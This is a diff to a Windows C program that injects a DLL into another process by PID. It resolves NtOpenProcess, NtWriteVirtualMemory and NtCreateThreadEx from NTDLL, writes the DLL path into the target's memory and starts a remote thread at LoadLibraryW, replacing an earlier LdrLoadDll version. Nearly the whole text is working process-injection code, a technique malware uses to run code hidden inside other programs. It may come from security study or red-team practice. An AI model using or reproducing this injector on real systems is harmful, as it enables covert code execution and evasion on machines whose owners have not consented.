@@ -43,18 +43,22 @@ int main(int argc, char* argv[]) {
 
     PID = atoi(argv[1]);
     hNTDLL = GetMod(L"NTDLL"); // Get a handle to native API to be used.
+    hKernel32 = GetMod(L"Kernel32");
 
     OBJECT_ATTRIBUTES OA = {sizeof(OA), NULL};
     CLIENT_ID CID = {(HANDLE)PID, NULL};
 
     info("Populating NT Functions...");
     NtOpenProcess SpyOpenProcess = (NtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");
+    if(!SpyOpenProcess){warn("Failed to load function NtOpenProcess, error: 0x%lx", GetLastError());goto CLEANUP;}
     NtAllocateVirtualMemoryEx SpyAllocateVirtualMemoryEx = (NtAllocateVirtualMemoryEx)GetProcAddress(hNTDLL, "NtAllocateVirtualMemoryEx");
+    if(!SpyAllocateVirtualMemoryEx){warn("Failed to load function NtAllocateVirtualMemoryEx, error: 0x%lx", GetLastError());goto CLEANUP;}
     NtClose SpyClose = (NtClose)GetProcAddress(hNTDLL, "NtClose");
+    if(!SpyClose){warn("Failed to load function NtClose, error: 0x%lx", GetLastError());goto CLEANUP;}
     NtWriteVirtualMemory SpyWriteVirtualMemory = (NtWriteVirtualMemory)GetProcAddress(hNTDLL, "NtWriteVirtualMemory");
-    LdrLoadDll SpyLoadDLL = (LdrLoadDll)GetProcAddress(hNTDLL, "LdrLoadDll");
+    if(!SpyWriteVirtualMemory){warn("Failed to load function NtWriteVirtualMemory, error: 0x%lx", GetLastError());goto CLEANUP;}
     NtCreateThreadEx SpyCreateRemoteThreadEx = (NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
-    PRtlInitUnicodeString spyInitUnicodeString = (PRtlInitUnicodeString)GetProcAddress(hNTDLL, "RtlInitUnicodeString");
+    if(!SpyCreateRemoteThreadEx){warn("Failed to load function NtCreateThreadEx, error: 0x%lx", GetLastError());goto CLEANUP;}
     okay("Complete, beginning injection.");
 
 
@@ -68,32 +72,21 @@ int main(int argc, char* argv[]) {
     okay("Got a handle on the process! (%ld)", PID);
     info("\\___[ hProcess\n\t\\_0x%p]\n", hProcess);
     
-    /* FIND SIZE OF THE UNICODE_STRING PATH TO BE INJECTED. */
-    info("Populating unicode string with DLL path...");
-    spyInitUnicodeString(&uString, dllPath);
-    if(&uString == NULL){
-        warn("Failed to initialise unicode string with path to DLL. Error: 0x%lx", GetLastError());
-    }
-    info("Finding the size of the dll path to be injected...");
-    SIZE_T stringLength = (wcslen(dllPath) + 1) * sizeof(WCHAR); // +1 for null terminator
-    SIZE_T totalSize = sizeof(UNICODE_STRING) + stringLength ;
-    okay("UNICODE_STRING fully populated and sized.");
-
-    /* ALLOCATE MEMORY TO THE PROCESS WE JUST GRABBED THE HANDLE OF. */
-    info("Attempting to allocate to process memory...");
-    rMemory = VirtualAllocEx(hProcess, NULL, totalSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
+    rMemory = VirtualAllocEx(hProcess, NULL, sizeof(dllPath), (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
     if(rMemory == NULL) {
         warn("[AllocateVirtualMemoryEx] failed, Error: 0x%lx", GetLastError());
         goto CLEANUP;
     }
-    okay("Allocated buffer to process memory with PAGE_READWRITE permissions at 0x%p", rMemory);
-    SpyWriteVirtualMemory(hProcess, rMemory, &uString, sizeof(UNICODE_STRING), NULL);
-    SpyWriteVirtualMemory(hProcess, (PBYTE)rMemory + sizeof(UNICODE_STRING), dllPath, stringLength, NULL);
+    
+    SpyWriteVirtualMemory(hProcess, rMemory, &dllPath, sizeof(dllPath), NULL);
 
-    rBuffer = (PBYTE)rMemory + sizeof(UNICODE_STRING);
-    SpyWriteVirtualMemory(hProcess, (PBYTE)rMemory + offsetof(UNICODE_STRING, Buffer), &rBuffer, sizeof(PVOID), NULL);
-
-    okay("Wrote UNICODE_STRING to process memory", dllPath);
+    LPTHREAD_START_ROUTINE startThis = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
+    if (startThis == NULL) {
+        warn("Failed to get the address to LoadLibraryW\nError: %ld", GetLastError());
+        CloseHandle(hProcess);
+        return EXIT_FAILURE;
+    }
+    okay("Got the address to LoadLibraryW\n\\___[ LoadLibraryW\n\t\\_0x%p]\n", startThis);
 
     /* Allocate and write DLL path into memory for later use*/
 
@@ -102,7 +95,7 @@ int main(int argc, char* argv[]) {
         THREAD_ALL_ACCESS,              // Full Thread Access
         NULL,                           // No object attributes
         hProcess,
-        SpyLoadDLL,
+        startThis,
         rMemory,
         0,
         0,
@@ -113,12 +106,8 @@ int main(int argc, char* argv[]) {
     // okay("%s Got a handle to the newly-created thread\n\\___[ hThread\n\t\\_0x%p]\n", hThread);
     info("Waiting for the thread to finish execution...");
 
-    waitResult = WaitForSingleObject(hThread, INFINITE);
-    if (waitResult == WAIT_FAILED) {
-        warn("Failed to wait for thread completion. Error: 0x%lx", GetLastError());
-    } else {
-        okay("Thread completed successfully.");
-    }
+    WaitForSingleObject(hThread, 30);
+    okay("Thread finished, beginning cleanup.");
     goto CLEANUP;
 
 CLEANUP:
